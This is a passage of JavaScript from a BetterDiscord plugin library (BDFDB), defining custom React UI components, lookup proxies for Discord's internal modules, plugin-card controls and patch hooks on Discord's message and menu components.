					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.TabBar, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						selectedItem: selectedItem,
						onItemSelect: this.handleItemSelect.bind(this),
						children: items.map(data => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TabBar.Item, {
							className: BDFDB.DOMUtils.formatClassName(this.props.itemClassName, selectedItem == data.value && this.props.itemSelectedClassName),
							itemType: this.props.type,
							id: data.value,
							children: renderItem(data),
							"aria-label": data.label || data.value
						}))
					}), "itemClassName", "items", "renderItem"));
				}
			};
			
			CustomComponents.Table = reactInitialized && class BDFDB_Table extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.Table, Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.table, this.props.className),
						headerCellClassName: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tableheadercell, this.props.headerCellClassName),
						sortedHeaderCellClassName: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tableheadercellsorted, this.props.sortedHeaderCellClassName),
						bodyCellClassName: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tablebodycell, this.props.bodyCellClassName),
						onSort: (sortKey, sortDirection) => {
							this.props.sortDirection = this.props.sortKey != sortKey && sortDirection == Internal.LibraryComponents.Table.SortDirection.ASCENDING && this.props.columns.filter(n => n.key == sortKey)[0].reverse ? Internal.LibraryComponents.Table.SortDirection.DESCENDING : sortDirection;
							this.props.sortKey = sortKey;
							this.props.data = BDFDB.ArrayUtils.keySort(this.props.data, this.props.sortKey);
							if (this.props.sortDirection == Internal.LibraryComponents.Table.SortDirection.DESCENDING) this.props.data.reverse();
							if (typeof this.props.onSort == "function") this.props.onSort(this.props.sortKey, this.props.sortDirection);
							BDFDB.ReactUtils.forceUpdate(this);
						}
					}));
				}
			};
			
			CustomComponents.TextArea = reactInitialized && class BDFDB_TextArea extends Internal.LibraryModules.React.Component {
				handleChange(e) {
					this.props.value = e;
					if (typeof this.props.onChange == "function") this.props.onChange(e, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				handleBlur(e) {if (typeof this.props.onBlur == "function") this.props.onBlur(e, this);}
				handleFocus(e) {if (typeof this.props.onFocus == "function") this.props.onFocus(e, this);}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.TextArea, Object.assign({}, this.props, {
						onChange: this.handleChange.bind(this),
						onBlur: this.handleBlur.bind(this),
						onFocus: this.handleFocus.bind(this)
					}));
				}
			};
			
			CustomComponents.TextGradientElement = reactInitialized && class BDFDB_TextGradientElement extends Internal.LibraryModules.React.Component {
				render() {
					if (this.props.gradient && this.props.children) return BDFDB.ReactUtils.createElement("span", {
						children: this.props.children,
						ref: instance => {
							let ele = BDFDB.ReactUtils.findDOMNode(instance);
							if (ele) {
								ele.style.setProperty("background-image", this.props.gradient, "important");
								ele.style.setProperty("color", "transparent", "important");
								ele.style.setProperty("-webkit-background-clip", "text", "important");
							}
						}
					});
					return this.props.children || null;
				}
			};
			
			CustomComponents.TextInput = reactInitialized && class BDFDB_TextInput extends Internal.LibraryModules.React.Component {
				handleChange(e) {
					let value = e = BDFDB.ObjectUtils.is(e) ? e.currentTarget.value : e;
					this.props.value = this.props.valuePrefix && !value.startsWith(this.props.valuePrefix) ? (this.props.valuePrefix + value) : value;
					if (typeof this.props.onChange == "function") this.props.onChange(this.props.value, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				handleInput(e) {if (typeof this.props.onInput == "function") this.props.onInput(BDFDB.ObjectUtils.is(e) ? e.currentTarget.value : e, this);}
				handleKeyDown(e) {if (typeof this.props.onKeyDown == "function") this.props.onKeyDown(e, this);}
				handleBlur(e) {if (typeof this.props.onBlur == "function") this.props.onBlur(e, this);}
				handleFocus(e) {if (typeof this.props.onFocus == "function") this.props.onFocus(e, this);}
				handleMouseEnter(e) {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);}
				handleMouseLeave(e) {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);}
				handleNumberButton(ins, value) {
					BDFDB.TimeUtils.clear(this.pressedTimeout);
					this.pressedTimeout = BDFDB.TimeUtils.timeout(_ => {
						delete this.props.focused;
						BDFDB.ReactUtils.forceUpdate(this);
					}, 1000);
					this.props.focused = true;
					this.handleChange.apply(this, [value]);
					this.handleInput.apply(this, [value]);
				}
				componentDidMount() {
					if (this.props.type == "file") {
						let navigatorInstance = BDFDB.ReactUtils.findOwner(this, {name: "BDFDB_FileButton"});
						if (navigatorInstance) navigatorInstance.refInput = this;
					}
					let input = BDFDB.ReactUtils.findDOMNode(this);
					if (!input) return;
					input = input.querySelector("input") || input;
					if (input && !input.patched) {
						input.addEventListener("keydown", e => {
							this.handleKeyDown.apply(this, [e]);
							e.stopImmediatePropagation();
						});
						input.patched = true;
					}
				}
				render() {
					let inputChildren = [
						BDFDB.ReactUtils.createElement("input", BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
							className: BDFDB.DOMUtils.formatClassName(this.props.size && Internal.LibraryComponents.TextInput.Sizes[this.props.size.toUpperCase()] && BDFDB.disCN["input" + this.props.size.toLowerCase()] || BDFDB.disCN.inputdefault, this.props.inputClassName, this.props.focused && BDFDB.disCN.inputfocused, this.props.error || this.props.errorMessage ? BDFDB.disCN.inputerror : (this.props.success && BDFDB.disCN.inputsuccess), this.props.disabled && BDFDB.disCN.inputdisabled, this.props.editable && BDFDB.disCN.inputeditable),
							type: this.props.type == "color" || this.props.type == "file" ? "text" : this.props.type,
							onChange: this.handleChange.bind(this),
							onInput: this.handleInput.bind(this),
							onKeyDown: this.handleKeyDown.bind(this),
							onBlur: this.handleBlur.bind(this),
							onFocus: this.handleFocus.bind(this),
							onMouseEnter: this.handleMouseEnter.bind(this),
							onMouseLeave: this.handleMouseLeave.bind(this),
							maxLength: this.props.type == "file" ? false : this.props.maxLength,
							style: this.props.width ? {width: `${this.props.width}px`} : {},
							ref: this.props.inputRef
						}), "errorMessage", "focused", "error", "success", "inputClassName", "inputChildren", "valuePrefix", "inputPrefix", "size", "editable", "inputRef", "style", "mode", "colorPickerOpen", "noAlpha", "filter", "useFilePath", "searchFolders")),
						this.props.inputChildren,
						this.props.type == "color" ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
							wrap: true,
							children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ColorSwatches, {
								colors: [],
								color: this.props.value && this.props.mode == "comp" ? BDFDB.ColorUtils.convert(this.props.value.split(","), "RGB") : this.props.value,
								onColorChange: color => this.handleChange.apply(this, [!color ? "" : (this.props.mode == "comp" ? BDFDB.ColorUtils.convert(color, "RGBCOMP").slice(0, 3).join(",") : BDFDB.ColorUtils.convert(color, this.props.noAlpha ? "RGB" : "RGBA"))]),
								pickerOpen: this.props.colorPickerOpen,
								onPickerOpen: _ => this.props.colorPickerOpen = true,
								onPickerClose: _ => delete this.props.colorPickerOpen,
								ref: this.props.controlsRef,
								pickerConfig: {gradient: false, alpha: this.props.mode != "comp" && !this.props.noAlpha}
							})
						}) : null,
						this.props.type == "file" ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FileButton, {
							filter: this.props.filter,
							mode: this.props.mode,
							useFilePath: this.props.useFilePath,
							searchFolders: this.props.searchFolders,
							ref: this.props.controlsRef
						}) : null
					].flat(10).filter(n => n);
					
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.inputwrapper, this.props.type == "number" && (this.props.size && Internal.LibraryComponents.TextInput.Sizes[this.props.size.toUpperCase()] && BDFDB.disCN["inputnumberwrapper" + this.props.size.toLowerCase()] || BDFDB.disCN.inputnumberwrapperdefault), this.props.className),
						style: this.props.style,
						children: [
							this.props.inputPrefix ? BDFDB.ReactUtils.createElement("span", {
								className: BDFDB.disCN.inputprefix
							}) : null,
							this.props.type == "number" ? BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.inputnumberbuttons,
								children: [
									BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.inputnumberbuttonup,
										onClick: e => {
											let min = parseInt(this.props.min);
											let max = parseInt(this.props.max);
											let newV = parseInt(this.props.value) + 1 || min || 0;
											if (isNaN(max) || !isNaN(max) && newV <= max) this.handleNumberButton.bind(this)(e._targetInst, isNaN(min) || !isNaN(min) && newV >= min ? newV : min);
										}
									}),
									BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.inputnumberbuttondown,
										onClick: e => {
											let min = parseInt(this.props.min);
											let max = parseInt(this.props.max);
											let newV = parseInt(this.props.value) - 1 || min || 0;
											if (isNaN(min) || !isNaN(min) && newV >= min) this.handleNumberButton.bind(this)(e._targetInst, isNaN(max) || !isNaN(max) && newV <= max ? newV : max);
										}
									})
								]
							}) : null,
							inputChildren.length == 1 ? inputChildren[0] : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
								align: Internal.LibraryComponents.Flex.Align.CENTER,
								children: inputChildren.map((child, i) => i != 0 ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
									shrink: 0,
									children: child
								}) : child)
							}),
							this.props.errorMessage ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextElement, {
								className: BDFDB.disCN.margintop8,
								size: Internal.LibraryComponents.TextElement.Sizes.SIZE_12,
								color: Internal.LibraryComponents.TextElement.Colors.STATUS_RED,
								children: this.props.errorMessage
							}) : null
						].filter(n => n)
					});
				}
			};
			
			CustomComponents.TextScroller = reactInitialized && class BDFDB_TextScroller extends Internal.LibraryModules.React.Component {
				render() {
					let scrolling, scroll = _ => {};
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.textscroller, this.props.className),
						style: Object.assign({}, this.props.style, {
							position: "relative",
							display: "block",
							overflow: "hidden"
						}),
						ref: instance => {
							const ele = BDFDB.ReactUtils.findDOMNode(instance);
							if (ele && ele.parentElement) {
								const maxWidth = BDFDB.DOMUtils.getInnerWidth(ele.parentElement);
								if (maxWidth > 50) ele.style.setProperty("max-width", `${maxWidth}px`);
								if (!this.props.initiated) BDFDB.TimeUtils.timeout(_ => {
									this.props.initiated = true;
									if (document.contains(ele.parentElement)) BDFDB.ReactUtils.forceUpdate(this);
								}, 3000);
								const Animation = new Internal.LibraryModules.AnimationUtils.Value(0);
								Animation.interpolate({inputRange: [0, 1], outputRange: [0, (BDFDB.DOMUtils.getRects(ele.firstElementChild).width - BDFDB.DOMUtils.getRects(ele).width) * -1]}).addListener(v => {
									ele.firstElementChild.style.setProperty("display", v.value == 0 ? "inline" : "block", "important");
									ele.firstElementChild.style.setProperty("left", `${v.value}px`, "important");
								});
								scroll = p => {
									const display = ele.firstElementChild.style.getPropertyValue("display");
									ele.firstElementChild.style.setProperty("display", "inline", "important");
									const innerWidth = BDFDB.DOMUtils.getRects(ele.firstElementChild).width;
									const outerWidth = BDFDB.DOMUtils.getRects(ele).width;
									ele.firstElementChild.style.setProperty("display", display, "important");
									
									let w = p + parseFloat(ele.firstElementChild.style.getPropertyValue("left")) / (innerWidth - outerWidth);
									w = isNaN(w) || !isFinite(w) ? p : w;
									w *= innerWidth / (outerWidth * 2);
									Internal.LibraryModules.AnimationUtils.parallel([Internal.LibraryModules.AnimationUtils.timing(Animation, {toValue: p, duration: Math.sqrt(w**2) * 4000 / (parseInt(this.props.speed) || 1)})]).start();
								};
							}
						},
						onClick: e => {
							if (typeof this.props.onClick == "function") this.props.onClick(e, this);
						},
						onMouseEnter: e => {
							if (BDFDB.DOMUtils.getRects(e.currentTarget).width < BDFDB.DOMUtils.getRects(e.currentTarget.firstElementChild).width || e.currentTarget.firstElementChild.style.getPropertyValue("display") != "inline") {
								scrolling = true;
								scroll(1);
							}
						},
						onMouseLeave: e => {
							if (scrolling) {
								scrolling = false;
								scroll(0);
							}
						},
						children: BDFDB.ReactUtils.createElement("div", {
							style: {
								left: "0",
								position: "relative",
								display: "inline",
								whiteSpace: "nowrap"
							},
							children: this.props.children
						})
					});
				}
			};
			CustomComponents.TooltipContainer = reactInitialized && class BDFDB_TooltipContainer extends Internal.LibraryModules.React.Component {
				updateTooltip(text) {
					if (this.tooltip) this.tooltip.update(text);
				}
				render() {
					let child = (typeof this.props.children == "function" ? this.props.children() : (BDFDB.ArrayUtils.is(this.props.children) ? this.props.children[0] : this.props.children)) || BDFDB.ReactUtils.createElement("div", {});
					child.props.className = BDFDB.DOMUtils.formatClassName(child.props.className, this.props.className);
					let childProps = Object.assign({}, child.props);
					let shown = false;
					child.props.onMouseEnter = (e, childThis) => {
						if (!shown && !e.currentTarget.__BDFDBtooltipShown && !(this.props.onlyShowOnShift && !e.shiftKey) && !(this.props.onlyShowOnCtrl && !e.ctrlKey)) {
							e.currentTarget.__BDFDBtooltipShown = shown = true;
							this.tooltip = BDFDB.TooltipUtils.create(e.currentTarget, typeof this.props.text == "function" ? this.props.text(this, e) : this.props.text, Object.assign({
								note: this.props.note,
								delay: this.props.delay
							}, this.props.tooltipConfig, {
								onHide: (tooltip, anker) => {
									delete anker.__BDFDBtooltipShown;
									shown = false;
									if (this.props.tooltipConfig && typeof this.props.tooltipConfig.onHide == "function") this.props.tooltipConfig.onHide(tooltip, anker);
								}
							}));
							if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);
							if (typeof childProps.onMouseEnter == "function") childProps.onMouseEnter(e, childThis);
						}
					};
					child.props.onMouseLeave = (e, childThis) => {
						if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);
						if (typeof childProps.onMouseLeave == "function") childProps.onMouseLeave(e, childThis);
					};
					child.props.onClick = (e, childThis) => {
						if (typeof this.props.onClick == "function") this.props.onClick(e, this);
						if (typeof childProps.onClick == "function") childProps.onClick(e, childThis);
						if (typeof this.props.text == "function") this.updateTooltip(this.props.text(this, e));
					};
					child.props.onContextMenu = (e, childThis) => {
						if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);
						if (typeof childProps.onContextMenu == "function") childProps.onContextMenu(e, childThis);
						if (typeof this.props.text == "function") this.updateTooltip(this.props.text(this, e));
					};
					return BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
						children: child
					});
				}
			};
			
			CustomComponents.UserPopoutContainer = reactInitialized && class BDFDB_UserPopoutContainer extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutContainer, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						wrap: false,
						renderPopout: instance => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.UserPopout, {
							user: Internal.LibraryModules.UserStore.getUser(this.props.userId),
							userId: this.props.userId,
							channelId: this.props.channelId,
							guildId: this.props.guildId
						}),
					}), "userId", "channelId", "guildId"));
				}
			};
			
			const VideoInner = function (props) {
				let ref = BDFDB.ReactUtils.useRef(null);
				BDFDB.ReactUtils.useEffect(_ => {
					if (ref.current) props.play ? ref.current.play() : ref.current.pause();
				}, [props.play]);
				return props.naturalWidth <= BDFDB.DiscordConstants.MAX_VIDEO_WIDTH && props.naturalHeight <= BDFDB.DiscordConstants.MAX_VIDEO_HEIGHT || props.naturalWidth <= BDFDB.DiscordConstants.MAX_VIDEO_HEIGHT && props.naturalHeight <= BDFDB.DiscordConstants.MAX_VIDEO_WIDTH ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.VideoForwardRef, {
					ref: ref,
					className: props.className,
					poster: props.poster,
					src: props.src,
					width: props.width,
					height: props.height,
					muted: true,
					loop: true,
					autoPlay: props.play,
					preload: "none"
				}) : BDFDB.ReactUtils.createElement("img", {
					alt: "",
					src: props.poster,
					width: props.width,
					height: props.height
				});
			};
			CustomComponents.Video = reactInitialized && class BDFDB_Video extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement(VideoInner, this.props);
				}
			};
			
			const NativeSubComponents = {};
			Internal.NativeSubComponents = new Proxy(NativeSubComponents, {
				get: function (_, item) {
					if (NativeSubComponents[item]) return NativeSubComponents[item];
					if (!InternalData.NativeSubComponents[item]) return "div";
					if (InternalData.NativeSubComponents[item].name) {
						if (InternalData.NativeSubComponents[item].protos) {
							NativeSubComponents[item] = BDFDB.ModuleUtils.find(m => m && m.displayName == InternalData.NativeSubComponents[item].name && m.prototype && InternalData.NativeSubComponents[item].protos.every(proto => m.prototype[proto]) && m);
							if (!NativeSubComponents[item]) BDFDB.LogUtils.warn(`${JSON.stringify([InternalData.NativeSubComponents[item].name, InternalData.NativeSubComponents[item].protos].flat(10))} [name + protos] not found in WebModules`);
						}
						else NativeSubComponents[item] = BDFDB.ModuleUtils.findByName(InternalData.NativeSubComponents[item].name);
					}
					else if (InternalData.NativeSubComponents[item].props) NativeSubComponents[item] = BDFDB.ModuleUtils.findByProperties(InternalData.NativeSubComponents[item].props);
					return NativeSubComponents[item] ? NativeSubComponents[item] : "div";
				}
			});
			
			const LibraryComponents = {};
			Internal.LibraryComponents = new Proxy(LibraryComponents, {
				get: function (_, item) {
					if (LibraryComponents[item]) return LibraryComponents[item];
					if (!InternalData.LibraryComponents[item] && !CustomComponents[item]) return "div";
					if (InternalData.LibraryComponents[item]) {
						if (InternalData.LibraryComponents[item].name) LibraryComponents[item] = BDFDB.ModuleUtils.findByName(InternalData.LibraryComponents[item].name);
						else if (InternalData.LibraryComponents[item].strings) LibraryComponents[item] = BDFDB.ModuleUtils.findByString(InternalData.LibraryComponents[item].strings);
						else if (InternalData.LibraryComponents[item].props) LibraryComponents[item] = BDFDB.ModuleUtils.findByProperties(InternalData.LibraryComponents[item].props);
						if (InternalData.LibraryComponents[item].value) LibraryComponents[item] = (LibraryComponents[item] || {})[InternalData.LibraryComponents[item].value];
						if (InternalData.LibraryComponents[item].assign) LibraryComponents[item] = Object.assign({}, LibraryComponents[item]);
					}
					if (CustomComponents[item]) LibraryComponents[item] = LibraryComponents[item] ? Object.assign({}, LibraryComponents[item], CustomComponents[item]) : CustomComponents[item];
					
					const NativeComponent = LibraryComponents[item] && Internal.NativeSubComponents[item];
					if (NativeComponent && typeof NativeComponent != "string") {
						for (let key in NativeComponent) if (key != "displayName" && key != "name" && (typeof NativeComponent[key] != "function" || key.charAt(0) == key.charAt(0).toUpperCase())) {
							if (key == "defaultProps") LibraryComponents[item][key] = Object.assign({}, LibraryComponents[item][key], NativeComponent[key]);
							else if (!LibraryComponents[item][key]) LibraryComponents[item][key] = NativeComponent[key];
						}
					}
					if (InternalData.LibraryComponents[item] && InternalData.LibraryComponents[item].children) {
						const SubComponents = LibraryComponents[item] && typeof LibraryComponents[item] == "object" ? LibraryComponents[item] : {};
						const InternalParentData = InternalData.LibraryComponents[item].children;
						LibraryComponents[item] = new Proxy(BDFDB.ObjectUtils.is(SubComponents) ? SubComponents : {}, {
							get: function (_, item2) {
								if (CustomComponents[item] && CustomComponents[item][item2]) return CustomComponents[item][item2];
								if (SubComponents[item2]) return SubComponents[item2];
								if (!InternalParentData[item2]) return "div";
								if (InternalParentData[item2].name) SubComponents[item2] = BDFDB.ModuleUtils.findByName(InternalParentData[item2].name);
								else if (InternalParentData[item2].strings) SubComponents[item2] = BDFDB.ModuleUtils.findByString(InternalParentData[item2].strings);
								else if (InternalParentData[item2].props) SubComponents[item2] = BDFDB.ModuleUtils.findByProperties(InternalParentData[item2].props); 
								
								if (InternalParentData[item2].value) SubComponents[item2] = (SubComponents[item2] || {})[InternalParentData[item2].value];
								if (InternalParentData[item2].assign) SubComponents[item] = Object.assign({}, SubComponents[item2]);
								if (CustomComponents[item2]) SubComponents[item2] = SubComponents[item2] ? Object.assign({}, SubComponents[item2], CustomComponents[item2]) : CustomComponents[item2];
								
								const NativeComponent = Internal.NativeSubComponents[item2];
								if (NativeComponent && typeof NativeComponent != "string") {
									for (let key in NativeComponent) if (key != "displayName" && key != "name" && (typeof NativeComponent[key] != "function" || key.charAt(0) == key.charAt(0).toUpperCase())) {
										if (key == "defaultProps") SubComponents[item2][key] = Object.assign({}, SubComponents[item2][key], NativeComponent[key]);
										else if (!SubComponents[item2][key]) SubComponents[item2][key] = NativeComponent[key];
									}
								}
								return SubComponents[item2] ? SubComponents[item2] : "div";
							}
						});
					}
					return LibraryComponents[item] ? LibraryComponents[item] : "div";
				}
			});
			
			BDFDB.LibraryComponents = Internal.LibraryComponents;
			
			Internal.createCustomControl = function (data) {
				let controlButton = BDFDB.DOMUtils.create(`<button class="${BDFDB.DOMUtils.formatClassName(BDFDB.disCN._repobutton, BDFDB.disCN._repocontrolsbutton, BDFDB.disCN._repocontrolscustom)}"></button>`);
				BDFDB.ReactUtils.render(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
					nativeClass: true,
					name: data.svgName,
					width: 20,
					height: 20
				}), controlButton);
				controlButton.addEventListener("click", _ => {if (typeof data.onClick == "function") data.onClick();});
				if (data.tooltipText) controlButton.addEventListener("mouseenter", _ => {BDFDB.TooltipUtils.create(controlButton, data.tooltipText);});
				return controlButton;
			};
			Internal.appendCustomControls = function (card) {
				if (!card || card.querySelector(BDFDB.dotCN._repocontrolscustom)) return;
				let checkbox = card.querySelector(BDFDB.dotCN._reposwitch);
				if (!checkbox) return;
				let props = BDFDB.ObjectUtils.get(BDFDB.ReactUtils.getInstance(card), "return.stateNode.props");
				let plugin = props && props.addon && (props.addon.plugin || props.addon.instance);
				if (plugin && (plugin == libraryInstance || plugin.name && plugin.name && PluginStores.loaded[plugin.name] && PluginStores.loaded[plugin.name] == plugin)) {
					let url = Internal.getPluginURL(plugin);
					let controls = [];
					let footerControls = card.querySelector(BDFDB.dotCNS._repofooter + BDFDB.dotCN._repocontrols);
					if (plugin.changeLog) controls.push(Internal.createCustomControl({
						tooltipText: BDFDB.LanguageUtils.LanguageStrings.CHANGE_LOG,
						svgName: Internal.LibraryComponents.SvgIcon.Names.CHANGELOG,
						onClick: _ => {BDFDB.PluginUtils.openChangeLog(plugin);}
					}));
					if (PluginStores.updateData.plugins[url] && PluginStores.updateData.plugins[url].outdated) controls.push(Internal.createCustomControl({
						tooltipText: BDFDB.LanguageUtils.LanguageStrings.UPDATE_MANUALLY,
						svgName: Internal.LibraryComponents.SvgIcon.Names.DOWNLOAD,
						onClick: _ => {BDFDB.PluginUtils.downloadUpdate(plugin.name, url);}
					}));
					if (footerControls) for (let control of controls) footerControls.insertBefore(control, footerControls.firstElementChild);
					else for (let control of controls) checkbox.parentElement.insertBefore(control, checkbox.parentElement.firstElementChild);
				}
			};
			Internal.addListObserver = function (layer) {
				if (!layer) return;
				BDFDB.ObserverUtils.connect(BDFDB, layer, {name: "cardObserver", instance: new MutationObserver(changes => {changes.forEach(change => {if (change.addedNodes) {change.addedNodes.forEach(n => {
					if (BDFDB.DOMUtils.containsClass(n, BDFDB.disCN._repocard)) Internal.appendCustomControls(n);
					if (n.nodeType != Node.TEXT_NODE) for (let c of n.querySelectorAll(BDFDB.dotCN._repocard)) Internal.appendCustomControls(c);
					Internal.appendCustomControls(BDFDB.DOMUtils.getParent(BDFDB.dotCN._repocard, n));
				});}});})}, {childList: true, subtree: true});
				for (let c of layer.querySelectorAll(BDFDB.dotCN._repocard)) Internal.appendCustomControls(c);
			}

			const keyDownTimeouts = {};
			BDFDB.ListenerUtils.add(BDFDB, document, "keydown.BDFDBPressedKeys", e => {
				if (!pressedKeys.includes(e.which)) {
					BDFDB.TimeUtils.clear(keyDownTimeouts[e.which]);
					pressedKeys.push(e.which);
					keyDownTimeouts[e.which] = BDFDB.TimeUtils.timeout(_ => {
						BDFDB.ArrayUtils.remove(pressedKeys, e.which, true);
					}, 60000);
				}
			});
			BDFDB.ListenerUtils.add(BDFDB, document, "keyup.BDFDBPressedKeys", e => {
				BDFDB.TimeUtils.clear(keyDownTimeouts[e.which]);
				BDFDB.ArrayUtils.remove(pressedKeys, e.which, true);
			});
			BDFDB.ListenerUtils.add(BDFDB, document, "mousedown.BDFDBMousePosition", e => {
				mousePosition = e;
			});
			BDFDB.ListenerUtils.add(BDFDB, window, "focus.BDFDBPressedKeysReset", e => {
				pressedKeys = [];
			});
			
			Internal.patchedModules = {
				before: {
					SearchBar: "render",
					EmojiPicker: "type",
					EmojiPickerListRow: "default"
				},
				after: {
					useCopyIdItem: "default",
					Menu: "default",
					SettingsView: "componentDidMount",
					Shakeable: "render",
					Message: "default",
					MessageToolbar: "type",
					MessageHeader: "default",
					MemberListItem: ["componentDidMount", "componentDidUpdate"],
					PrivateChannel: ["componentDidMount", "componentDidUpdate"],
					AnalyticsContext: ["componentDidMount", "componentDidUpdate"],
					PeopleListItem: ["componentDidMount", "componentDidUpdate"],
					DiscordTag: "default"
				}
			};
			
			Internal.processUseCopyIdItem = function (e) {
				if (!e.returnvalue) e.returnvalue = false;
			};
			
			const menuExtraPatches = {};
			Internal.processMenu = function (e) {
				if (e.instance.props.navId) switch (e.instance.props.navId) {
					case "guild-header-popout":
						if (menuExtraPatches["guild-header-popout"]) return;
						menuExtraPatches["guild-header-popout"] = true;
						BDFDB.TimeUtils.interval((interval, count) => {
							if (count > 20) return BDFDB.TimeUtils.clear(interval);
							else {
								let module = BDFDB.ModuleUtils.findByString("guild-header-popout");
								if (module) BDFDB.PatchUtils.patch(BDFDB, module.default.prototype, "render", {after: e2 => {
									BDFDB.PatchUtils.patch(BDFDB, e2.returnValue.type, "type", {after: e3 => {
										Internal.triggerQueuePatch("GuildHeaderContextMenu", {
											arguments: e3.methodArguments,
											instance: {props: e3.methodArguments[0]},
											returnvalue: e3.returnValue,
											component: e2.returnValue,
											methodname: "type",
											type: "GuildHeaderContextMenu"
										});
									}}, {noCache: true});
								}});
							}
						}, 500);
						return;
				}
				if (!e.instance.props.children || BDFDB.ArrayUtils.is(e.instance.props.children) && !e.instance.props.children.length) Internal.LibraryModules.ContextMenuUtils.closeContextMenu();
			};
			
				
			Internal.processSearchBar = function (e) {
				if (typeof e.instance.props.query != "string") e.instance.props.query = "";
			};
				
			Internal.processSettingsView = function (e) {
				if (e.node && e.node.parentElement && e.node.parentElement.getAttribute("aria-label") == BDFDB.DiscordConstants.Layers.USER_SETTINGS) Internal.addListObserver(e.node.parentElement);
			};
		
			let AppViewExport = InternalData.ModuleUtilsConfig.Finder.AppView && BDFDB.ModuleUtils.findByString(InternalData.ModuleUtilsConfig.Finder.AppView.strings, false);
			if (AppViewExport) Internal.processShakeable = function (e) {
				let [children, index] = BDFDB.ReactUtils.findParent(e.returnvalue, {filter: n => {
					if (!n || typeof n.type != "function") return;
					let typeString = n.type.toString();
					return [InternalData.ModuleUtilsConfig.Finder.AppView.strings].flat(10).filter(n => typeof n == "string").every(string => typeString.indexOf(string) > -1);
				}});
				if (index > -1) children[index] = BDFDB.ReactUtils.createElement(AppViewExport.exports.default, children[index].props);
			};
			
			Internal.processMessage = function (e) {
				if (e.returnvalue && e.returnvalue.props && e.returnvalue.props.children && e.returnvalue.props.children.props) {
					let message;
					for (let key in e.instance.props) {
						if (!message) message = BDFDB.ObjectUtils.get(e.instance.props[key], "props.message");
						else break;
					}
					if (message) {
						e.returnvalue.props.children.props[InternalData.authorIdAttribute] = message.author.id;
						if (Internal.LibraryModules.RelationshipStore.isFriend(message.author.id)) e.returnvalue.props.children.props[InternalData.authorFriendAttribute] = true;
						if (message.author.id == BDFDB.UserUtils.me.id) e.returnvalue.props.children.props[InternalData.authorSelfAttribute] = true;
					}
				}
			};
			
			Internal.processMessageToolbar = function (e) {
				if (document.querySelector(BDFDB.dotCN.emojipicker) || !BDFDB.ObjectUtils.toArray(PluginStores.loaded).filter(p => p.started).some(p => p.onSystemMessageOptionContextMenu || p.onSystemMessageOptionToolbar || p.onMessageOptionContextMenu || p.onMessageOptionToolbar)) return;
				let toolbar = BDFDB.ReactUtils.findChild(e.returnvalue, {filter: c => c && c.props && c.props.showMoreUtilities != undefined && c.props.showEmojiPicker != undefined && c.props.setPopout != undefined});
				if (toolbar) BDFDB.PatchUtils.patch(BDFDB, toolbar, "type", {after: e2 => {
					let menu = BDFDB.ReactUtils.findChild(e2.returnValue, {filter: c => c && c.props && typeof c.props.onRequestClose == "function" && c.props.onRequestClose.toString().indexOf("moreUtilities") > -1});
					let isSystem = BDFDB.MessageUtils.isSystemMessage(e2.methodArguments[0] && e2.methodArguments[0].message);
					Internal.triggerQueuePatch(isSystem ? "SystemMessageOptionToolbar" : "MessageOptionToolbar", {
						arguments: e2.methodArguments,
						instance: {props: e2.methodArguments[0]},
						returnvalue: e2.returnValue,
						methodname: "default",
						type: isSystem ? "SystemMessageOptionToolbar" : "MessageOptionToolbar"
					});
					if (menu && typeof menu.props.renderPopout == "function") {
						let renderPopout = menu.props.renderPopout;
						menu.props.renderPopout = BDFDB.TimeUtils.suppress((...args) => {
							let renderedPopout = renderPopout(...args);
							renderedPopout.props.updatePosition = _ => {};
							BDFDB.PatchUtils.patch(BDFDB, renderedPopout, "type", {after: e3 => {
								let isSystem = BDFDB.MessageUtils.isSystemMessage(e3.methodArguments[0] && e3.methodArguments[0].message);
								Internal.triggerQueuePatch(isSystem ? "SystemMessageOptionContextMenu" : "MessageOptionContextMenu", {
									arguments: e3.methodArguments,
									instance: {props: e3.methodArguments[0]},
									returnvalue: e3.returnValue,
									methodname: "default",
									type: isSystem ? "SystemMessageOptionContextMenu" : "MessageOptionContextMenu"
								});
							}}, {noCache: true});
							return renderedPopout;
						}, "Error in Popout Render of MessageOptionToolbar!");
					}
				}}, {once: true});
			};

			const BDFDB_Patrons = Object.assign({}, InternalData.BDFDB_Patrons), BDFDB_Patron_Tiers = Object.assign({}, InternalData.BDFDB_Patron_Tiers);
